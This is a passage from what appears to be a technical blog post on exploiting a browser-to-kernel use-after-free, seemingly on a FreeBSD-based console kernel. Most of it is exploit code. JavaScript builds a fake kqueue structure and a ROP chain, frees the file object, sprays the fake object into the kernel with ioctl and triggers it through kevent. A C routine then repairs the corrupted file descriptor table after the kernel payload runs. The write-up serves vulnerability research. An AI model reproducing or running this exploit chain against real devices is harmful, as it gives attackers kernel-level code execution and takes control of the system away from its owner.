    &lt;span class=&quot;nx&quot;&gt;write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;jmpbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rop_scratch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// rdi&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;jmpbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;// rcx (why?)&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;jmpbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xe0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;gadgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// next rip&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;jmpbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rop_stack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;// rsp&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// longjmp_tail needs at least 1 stack slot to push next rip onto&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;knl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x08&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;gadgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;           &lt;span class=&quot;c1&quot;&gt;// kl_lock&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;knl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;gadgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;longjmp_tail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// kl_unlock&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;knl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;gadgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;           &lt;span class=&quot;c1&quot;&gt;// kl_assert_locked&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;knl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;gadgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;           &lt;span class=&quot;c1&quot;&gt;// kl_assert_unlocked&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;knl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;jmpbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                &lt;span class=&quot;c1&quot;&gt;// kl_lockarg (passed as&lt;/span&gt;
                                                    &lt;span class=&quot;c1&quot;&gt;// rdi to the above funcptrs)&lt;/span&gt;

    &lt;span class=&quot;nx&quot;&gt;write32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                        &lt;span class=&quot;c1&quot;&gt;// f_isfd = 1&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;gadgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ret0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// f_event = {ret 0}&lt;/span&gt;

    &lt;span class=&quot;nx&quot;&gt;write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;kn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;knl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                &lt;span class=&quot;c1&quot;&gt;// kn_knlist&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;write32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;kn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;EVFILT_READ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// kn_filter = EVFILT_READ (16bit)&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;write32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;kn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                  &lt;span class=&quot;c1&quot;&gt;// kn_status = KN_QUEUED&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;kn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x68&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                &lt;span class=&quot;c1&quot;&gt;// kn_fop&lt;/span&gt;

    &lt;span class=&quot;nx&quot;&gt;write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;kl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;kn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// slh_first = &amp;amp;kn&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;writeFakeMtx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fakekq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// kq_lock&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;write32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fakekq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xa4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// kq_knlistsize = 1&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fakekq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xa8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;kl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;// kq_knlist = &amp;amp;kl&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;change&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;allocateGCMemory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;kevent_sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;clearMemory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;change&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;kevent_sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;write32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;change&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;EVFILT_READ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// free, try to fill the buffer, then cause it to be used&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;kernelFree&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;filep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ioctlSpray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fakekq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;kqueue_sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;callFunc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;syms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;libkernel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;kevent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fakefd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;change&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// safe as long as injected code has fixed the corrupted kqueue&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;callFunc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;syms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;libkernel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fakefd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Above is shown the creation of a &lt;code&gt;kqueue&lt;/code&gt; object in userspace, which then gets sprayed into the kernel after performing our UAF primitive (via &lt;code&gt;kernelFree()&lt;/code&gt;) simply by calling &lt;code&gt;ioctl()&lt;/code&gt; with it. After the spray, executing the syscall &lt;code&gt;kevent()&lt;/code&gt; with the fd relating to our corrupted &lt;code&gt;file&lt;/code&gt; object will cause the kernel to call the &lt;code&gt;kqueue&lt;/code&gt; object’s &lt;code&gt;kl_unlock&lt;/code&gt; function pointer, which will kick off execution of the ROP chain.&lt;/p&gt;
&lt;h2 id=&quot;cleaning-up&quot;&gt;Cleaning Up&lt;/h2&gt;
&lt;p&gt;Since this exploit leaves a corrupted &lt;code&gt;file&lt;/code&gt; object in the browser’s file descriptor table, the first thing for the kernel payload to do is actually to remove that corruption. Otherwise, the kernel will eventually panic (normally while iterating the process’ file descriptor table in an attempt to &lt;code&gt;close()&lt;/code&gt; all of them). This can easily be done with the following:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;14&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;fix_corrupted_kqueue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;thread&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;td&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// This method prevents the kernel from crashing (most of the time), but&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// the process will sigsegv when exiting.&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// blog note:&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//   I actually no longer remember if the above comment is true.&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//   I always kexec directly to linux so it doesn't matter to me :)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filedesc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fdp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;td&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;td_proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p_fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fdp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd_nfiles&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fdp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd_ofiles&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DTYPE_KQUEUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kqueue&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uintptr_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kq_knlist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VM_USER_MAX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;c1&quot;&gt;// found the bad one...kill it&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;SLIST_REMOVE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fdp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd_kqlist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kqueue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kq_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;fdp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd_ofiles&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;fdp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd_ofileflags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fix_corrupted_kqueue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curthread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;

